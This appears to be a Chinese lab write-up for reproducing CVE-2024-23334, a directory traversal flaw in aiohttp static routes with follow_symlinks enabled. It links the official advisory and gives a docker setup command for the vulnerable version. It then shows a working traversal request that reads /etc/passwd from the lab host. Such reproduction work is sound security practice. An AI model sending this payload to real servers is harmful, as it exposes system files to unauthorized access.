# CVE-2024-23334 AIOHTTP 目录遍历漏洞

aiohttp是一个基于asyncio库实现的HTTP客户端/服务器框架，它支持高性能和高并发的HTTP通信。aiohttp用于编写异步的Web服务器、Web应用程序或HTTP客户端，以提供对Web和HTTP资源的访问和操作。使用 aiohttp 作为 Web 服务器并配置静态路由时，需要指定静态文件的根路径。此外，选项“follow_symlinks”可用于确定是否遵循静态根目录之外的符号链接。当“follow_symlinks”设置为 True 时，不会进行验证来检查给定的文件路径是否在根目录中。这可能导致目录遍历漏洞，导致未经授权访问系统上的任意文件，即使符号链接不存在也是如此。

项目库链接[aio-libs/aiohttp: Asynchronous HTTP client/server framework for asyncio and Python (github.com)](https://github.com/aio-libs/aiohttp)

参考链接：

- [aiohttp.web.static(follow_symlinks=True) is vulnerable to directory traversal · Advisory · aio-libs/aiohttp (github.com)](https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f)
- [NVD - CVE-2024-23334 (nist.gov)](https://nvd.nist.gov/vuln/detail/CVE-2024-23334)
- https://blog.csdn.net/shelter1234567/article/details/136453006?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22136453006%22%2C%22source%22%3A%22shelter1234567%22%7D

## 环境搭建

执行如下命令启动一个包含漏洞的aiohttp-v3.9.1环境：

```
docker compose up -d
```

## 漏洞复现

burp发包 遍历系统的passwd文件

```
GET /static/../../../../etc/passwd HTTP/1.1
Host: 192.168.116.128:8080
Content-Length: 2
```

![](https://img-blog.csdnimg.cn/direct/dc76ba2de52443dea5ce8b8937166a5d.png)